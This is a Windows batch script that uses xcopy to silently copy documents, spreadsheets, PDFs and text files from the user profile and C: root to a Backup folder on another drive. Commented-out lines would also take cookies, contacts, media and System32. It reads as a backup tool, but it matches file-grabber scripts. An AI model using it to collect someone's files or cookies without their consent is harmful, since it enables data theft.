@echo off
cls
md %drive%\Backup
::copy  "E:\Moves\*.*" "%removablestorage%\Copy_All\" /Z /y /L
::copy "C:\Windows\System32\*.*" "%drive%\Copy_All\" /Z /Y /L
@echo on
:: variables SET 
SET odrive=%odrive:~0,2% 
set Backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo on 
color 0a
::%Backupcmd% "%USERPROFILE%\Contacts\*.*" "%drive%\Backup\Contacts\*.*"
color 1c
::%Backupcmd% "USERPROFILE%\Cookies\*.*" "%drive%\Backup\Cookies\*.*"
color 2e
::%Backupcmd% "%USERPROFILE%\Desktop\*.jpg" "%drive%\Backup\Pictures\*.jpg" 
::%Backupcmd% "%USERPROFILE%\Desktop\*.jpeg" "%drive%\Backup\Pictures\*.jpeg" 
::%Backupcmd% "%USERPROFILE%\Desktop\*.bmp" "%drive%\Backup\Pictures\*.bmp" 
::%Backupcmd% "%USERPROFILE%\Desktop\*.3gp" "%drive%\Backup\Videos\*.3gp" 
::%Backupcmd% "%USERPROFILE%\Desktop\*.mp4" "%drive%\Backup\Videos\*.mp4" 
::%Backupcmd% "%USERPROFILE%\Desktop\*.avi" "%drive%\Backup\Videos\*.avi" 
::%Backupcmd% "%USERPROFILE%\Desktop\*.wmv" "%drive%\Backup\Videos\*.wmv"
::%Backupcmd% "%USERPROFILE%\Desktop\*.docx" "%drive%\Backup\Documents\*.docx"
::%Backupcmd% "%USERPROFILE%\Desktop\*.xlsx" "%drive%\Backup\Documents\*.xlsx"
::%Backupcmd% "%USERPROFILE%\Desktop\*.pdf" "%drive%\Backup\Documents\*.*"
color 3f
::%Backupcmd% "%USERPROFILE%\Documents\*.docx" "%drive%\Backup\Documents\*.*"
::%Backupcmd% "%USERPROFILE%\Documents\*.xlsx" "%drive%\Backup\Documents\*.*"
::%Backupcmd% "%USERPROFILE%\Documents\*.pdf" "%drive%\Backup\Documents\*.*"

color 4f
::%Backupcmd% "%USERPROFILE%\Downloads\*.docx" "%drive%\Backup\Downloads\*.*"
::%Backupcmd% "%USERPROFILE%\Downloads\*.doc" "%drive%\Backup\Downloads\*.*"
::%Backupcmd% "%USERPROFILE%\Downloads\*.pdf" "%drive%\Backup\Downloads\*.*"
::%Backupcmd% "%USERPROFILE%\Downloads\*.xlsx" "%drive%\Backup\Downloads\*.*"
color 5b
::%Backupcmd% "%USERPROFILE%\Favorites\*.*" "%drive%\Backup\Favorites\*.*"
color 69
::%Backupcmd% "%USERPROFILE%\Links\*.*" "%drive%\Backup\Links\*.*" 
color 70
::%Backupcmd% "%USERPROFILE%\My Music\*.mp3" "%drive%\Backup\My Music\*.mp3"
::%Backupcmd% "%USERPROFILE%\Music\*.mp3" "%drive%\Backup\Music\*.mp3" 
color 8d
::%Backupcmd% "%USERPROFILE%\My Documents\*.*" "%drive%\Backup\My Documents\*.*"

color 94
::%Backupcmd% "%USERPROFILE%\My Pictures\*.*" "%drive%\Backup\My Pictures\*.*"
::%Backupcmd% "%USERPROFILE%\Pictures\*.*" "%drive%\Backup\Pictures\*.*"
color 10
::%Backupcmd% "%USERPROFILE%\onedrive\*.*" "%drive%\onedrive\*.*"
::%Backupcmd% "%USERPROFILE%\Videos\*.*" "%drive%\Backup\Videos\*.*" 
color 13
::%Backupcmd% "C:\Windows\System32\*.*" "%drive%\Backup\System32\*.*"
%Backupcmd% "%USERPROFILE%\*.xlsx" "%drive%\Backup\C\*.xlsx"
%Backupcmd% "%USERPROFILE%\*.xls" "%drive%\Backup\C\*.xls"
%Backupcmd% "%USERPROFILE%\*.docx" "%drive%\Backup\C\*.docx"
%Backupcmd% "%USERPROFILE%\*.doc" "%drive%\Backup\C\*.*"
%Backupcmd% "%USERPROFILE%\*.pdf" "%drive%\Backup\C\*.*"

%Backupcmd% "C:\*.xlsx" "%drive%\Backup\C\*.xlsx"
%Backupcmd% "C:\*.xls" "%drive%\Backup\C\*.xls"
%Backupcmd% "C:\*.docx" "%drive%\Backup\C\*.docx"
%Backupcmd% "C:\*.doc" "%drive%\Backup\C\*.*"
%Backupcmd% "C:\*.pdf" "%drive%\Backup\C\*.*"
%Backupcmd% "C:\*.text" "%drive%\Backup\C\*.*"
%Backupcmd% "C:\*.txt" "%drive%\Backup\C\*.*"
:: ====================================================================================

cls
exit;